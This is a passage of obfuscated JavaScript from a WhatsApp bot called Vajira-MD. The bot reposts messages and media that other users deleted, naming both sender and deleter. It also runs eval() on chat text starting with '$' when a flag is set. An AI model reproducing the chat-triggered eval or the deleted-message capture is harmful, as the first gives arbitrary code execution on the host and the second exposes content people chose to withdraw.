                    if (_0x190453.message && _0x190453.message.exetendedTextMessage && _0x190453.msg.text) {
                      const _0x4ad197 = _0x190453.msg.text;
                      if (_0x16cdf1 && _0x4ad197.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0xf0d0e3 = "```";
                      _0x5b4381.sendMessage(_0x4b906c, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + _0xf0d0e3 + _0x4ad197 + _0xf0d0e3
                      });
                    } else {
                      if (_0x190453.message && _0x190453.message.exetendedTextMessage) {
                        if (_0x16cdf1 && messageText.includes('chat.whatsapp.com')) {
                          return;
                        }
                        var _0xf0d0e3 = "```";
                        _0x5b4381.sendMessage(_0x4b906c, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + _0xf0d0e3 + _0x190453.body + _0xf0d0e3
                        });
                      } else {
                        if (_0x190453.type === 'extendedTextMessage') {
                          async function _0x5d85db() {
                            if (_0x190453.message.extendedTextMessage) {
                              if (_0x16cdf1 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x5b4381.sendMessage(_0x4b906c, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + "```" + _0x190453.message.extendedTextMessage.text + "```"
                              });
                            } else {
                              if (_0x16cdf1 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x5b4381.sendMessage(_0x4b906c, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + "```" + _0x190453.message.extendedTextMessage.text + "```"
                              });
                            }
                          }
                          _0x5d85db();
                        } else {
                          if (_0x190453.type === 'imageMessage') {
                            async function _0x46ad40() {
                              var _0x5e77a7 = getRandom('');
                              const _0x136882 = sms(_0x5b4381, _0x190453);
                              let _0x167398 = await _0x136882.download(_0x5e77a7);
                              let _0x2f7f51 = require('file-type');
                              let _0x59cd82 = _0x2f7f51.fromBuffer(_0x167398);
                              await fs.promises.writeFile('./' + _0x59cd82.ext, _0x167398);
                              if (_0x190453.message.imageMessage.caption) {
                                const _0x1c73bd = _0x190453.message.imageMessage.caption;
                                if (_0x16cdf1 && _0x1c73bd.includes("chat.whatsapp.com")) {
                                  return;
                                }
                                await _0x5b4381.sendMessage(_0x4b906c, {
                                  'image': fs.readFileSync('./' + _0x59cd82.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + _0x190453.message.imageMessage.caption
                                });
                              } else {
                                await _0x5b4381.sendMessage(_0x4b906c, {
                                  'image': fs.readFileSync('./' + _0x59cd82.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + '_'
                                });
                              }
                            }
                            _0x46ad40();
                          } else {
                            if (_0x190453.type === "videoMessage") {
                              async function _0x19f3a9() {
                                var _0x2e0114 = getRandom('');
                                const _0x530096 = sms(_0x5b4381, _0x190453);
                                const _0x35a5d7 = _0x190453.message.videoMessage.fileLength;
                                const _0x49362e = _0x190453.message.videoMessage.seconds;
                                const _0x30b298 = config.MAX_SIZE;
                                const _0x5e2ab3 = _0x35a5d7 / 1048576;
                                if (_0x190453.message.videoMessage.caption) {
                                  if (_0x5e2ab3 < _0x30b298 && _0x49362e < 1800) {
                                    let _0x1ee5e5 = await _0x530096.download(_0x2e0114);
                                    let _0xd9d023 = require("file-type");
                                    let _0x24ac12 = _0xd9d023.fromBuffer(_0x1ee5e5);
                                    await fs.promises.writeFile('./' + _0x24ac12.ext, _0x1ee5e5);
                                    const _0x2e4855 = _0x190453.message.videoMessage.caption;
                                    if (_0x16cdf1 && _0x2e4855.includes('chat.whatsapp.com')) {
                                      return;
                                    }
                                    await _0x5b4381.sendMessage(_0x4b906c, {
                                      'video': fs.readFileSync('./' + _0x24ac12.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + _0x190453.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0x2e4383 = await _0x530096.download(_0x2e0114);
                                  let _0x282750 = require("file-type");
                                  let _0x50f9e0 = _0x282750.fromBuffer(_0x2e4383);
                                  await fs.promises.writeFile('./' + _0x50f9e0.ext, _0x2e4383);
                                  const _0x4dbed9 = _0x190453.message.videoMessage.fileLength;
                                  const _0x3fd397 = _0x190453.message.videoMessage.seconds;
                                  const _0x12c589 = config.MAX_SIZE;
                                  const _0x40e24f = _0x4dbed9 / 1048576;
                                  if (_0x40e24f < _0x12c589 && _0x3fd397 < 1800) {
                                    await _0x5b4381.sendMessage(_0x4b906c, {
                                      'video': fs.readFileSync('./' + _0x50f9e0.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + '_'
                                    });
                                  }
                                }
                              }
                              _0x19f3a9();
                            } else {
                              if (_0x190453.type === "documentMessage") {
                                async function _0x32f14a() {
                                  var _0x34733f = getRandom('');
                                  const _0x5ee49a = sms(_0x5b4381, _0x190453);
                                  let _0x48852f = await _0x5ee49a.download(_0x34733f);
                                  let _0x5c67de = require("file-type");
                                  let _0x285b25 = _0x5c67de.fromBuffer(_0x48852f);
                                  await fs.promises.writeFile('./' + _0x285b25.ext, _0x48852f);
                                  if (_0x190453.message.documentWithCaptionMessage) {
                                    await _0x5b4381.sendMessage(_0x4b906c, {
                                      'document': fs.readFileSync('./' + _0x285b25.ext),
                                      'mimetype': _0x190453.message.documentMessage.mimetype,
                                      'fileName': _0x190453.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                    });
                                  } else {
                                    await _0x5b4381.sendMessage(_0x4b906c, {
                                      'document': fs.readFileSync('./' + _0x285b25.ext),
                                      'mimetype': _0x190453.message.documentMessage.mimetype,
                                      'fileName': _0x190453.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                    });
                                  }
                                }
                                _0x32f14a();
                              } else {
                                if (_0x190453.type === "audioMessage") {
                                  async function _0xf6c1ca() {
                                    var _0x394594 = getRandom('');
                                    const _0x548f0a = sms(_0x5b4381, _0x190453);
                                    let _0x273ffd = await _0x548f0a.download(_0x394594);
                                    let _0x17b04e = require('file-type');
                                    let _0x8b6f9 = _0x17b04e.fromBuffer(_0x273ffd);
                                    await fs.promises.writeFile('./' + _0x8b6f9.ext, _0x273ffd);
                                    if (_0x190453.message.audioMessage) {
                                      const _0x2a6632 = await _0x5b4381.sendMessage(_0x4b906c, {
                                        'audio': fs.readFileSync('./' + _0x8b6f9.ext),
                                        'mimetype': _0x190453.message.audioMessage.mimetype,
                                        'fileName': _0x4c0316.id + ".mp3"
                                      });
                                      return await _0x5b4381.sendMessage(_0x4b906c, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                      }, {
                                        'quoted': _0x2a6632
                                      });
                                    } else {
                                      if (_0x190453.message.audioMessage.ptt === 'true') {
                                        const _0x4019a7 = await _0x5b4381.sendMessage(_0x4b906c, {
                                          'audio': fs.readFileSync('./' + _0x8b6f9.ext),
                                          'mimetype': _0x190453.message.audioMessage.mimetype,
                                          'ptt': 'true',
                                          'fileName': _0x4c0316.id + ".mp3"
                                        });
                                        return await _0x5b4381.sendMessage(_0x4b906c, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                        }, {
                                          'quoted': _0x4019a7
                                        });
                                      }
                                    }
                                  }
                                  _0xf6c1ca();
                                } else {
                                  if (_0x190453.type === "stickerMessage") {
                                    async function _0x17b365() {
                                      var _0x41b902 = getRandom('');
                                      const _0x645a06 = sms(_0x5b4381, _0x190453);
                                      let _0x1c9b3d = await _0x645a06.download(_0x41b902);
                                      let _0x6ffdd6 = require("file-type");
                                      let _0x23406d = _0x6ffdd6.fromBuffer(_0x1c9b3d);
                                      await fs.promises.writeFile('./' + _0x23406d.ext, _0x1c9b3d);
                                      if (_0x190453.message.stickerMessage) {
                                        const _0x2bf8fa = await _0x5b4381.sendMessage(_0x4b906c, {
                                          'sticker': fs.readFileSync('./' + _0x23406d.ext),
                                          'package': "VAJIRA-MD 🌟"
                                        });
                                        return await _0x5b4381.sendMessage(_0x4b906c, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                        }, {
                                          'quoted': _0x2bf8fa
                                        });
                                      } else {
                                        const _0x2de231 = await _0x5b4381.sendMessage(_0x4b906c, {
                                          'sticker': fs.readFileSync('./' + _0x23406d.ext),
                                          'package': "VAJIRA-MD 🌟"
                                        });
                                        return await _0x5b4381.sendMessage(_0x4b906c, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n"
                                        }, {
                                          'quoted': _0x2de231
                                        });
                                      }
                                    }
                                    _0x17b365();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (!_0x16cdf1) {
              if (_0x17deea.msg && _0x17deea.msg.type === 0x0) {
                _0x491a48(_0x17deea);
              } else {
                _0x2633ba(_0x17deea);
              }
            }
          }
        }
      }
      switch (_0x370df7) {
        case 'jid':
          _0x267ddb(_0x119ded);
          break;
        default:
          if (_0x2be52d && _0xd6496a.startsWith('$')) {
            let _0x1241b9 = _0xd6496a.split('$')[0x1];
            let _0x21b8ac = _0x1241b9.replace('°', ".toString()");
            try {
              let _0x25f2b2 = await eval(_0x21b8ac);
              l;
              if (typeof _0x25f2b2 === "object") {
                _0x267ddb(util.format(_0x25f2b2));
              } else {
                _0x267ddb(util.format(_0x25f2b2));
              }
            } catch (_0x5c66ee) {
              _0x267ddb(util.format(_0x5c66ee));
            }
          }
      }
    } catch (_0x1ffee2) {
      const _0x187186 = String(_0x1ffee2);
      console.log(_0x187186);
    }
  });
}
app.get('/', (_0x58bdbe, _0x5e3c72) => {
  _0x5e3c72.send("📟 Vajira-Md Working successfully!");
});
app.listen(port, () => console.log("Vajira-Md Server listening on port http://localhost:" + port));
setTimeout(() => {
  connectToWA();
}, 0xbb8);